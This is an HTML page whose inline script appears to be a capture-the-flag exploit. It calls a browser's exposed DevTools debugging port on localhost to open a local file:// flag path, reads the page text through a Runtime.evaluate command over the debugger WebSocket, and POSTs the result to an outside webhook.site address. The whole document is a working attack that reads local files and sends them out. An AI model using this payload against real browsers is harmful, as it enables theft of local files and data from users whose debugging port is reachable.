
<!doctype html>
<html>
<body>
<pre id="out">Starting CDP test...</pre>
<script>
(async () => {
  const out = document.getElementById("out");
  const webhook =
    "https://webhook.site/cc90bdd9-e54f-4fae-865b-e49f3735034c";

  async function report(value) {
    out.textContent = value;
    try {
      await fetch(webhook, {
        method: "POST",
        mode: "no-cors",
        body: value
      });
    } catch (e) {
      out.textContent += "\nWebhook error: " + e;
    }
  }

  try {
    const path =
      "/challenge/flag-53035d3cba0664dfac37ff64b6e0f86e";

    const response = await fetch(
      "http://localhost:9222/json/new?file://" + path,
      { method: "PUT" }
    );

    const tab = await response.json();
    const ws = new WebSocket(tab.webSocketDebuggerUrl);

    ws.onopen = () => {
      ws.send(JSON.stringify({
        id: 1,
        method: "Runtime.evaluate",
        params: {
          expression: "document.body.innerText"
        }
      }));
    };

    ws.onmessage = async (event) => {
      await report(event.data);
    };

    ws.onerror = () => report("CDP WebSocket connection failed");
  } catch (error) {
    await report("Error: " + String(error));
  }
})();
</script>
</body>
</html>
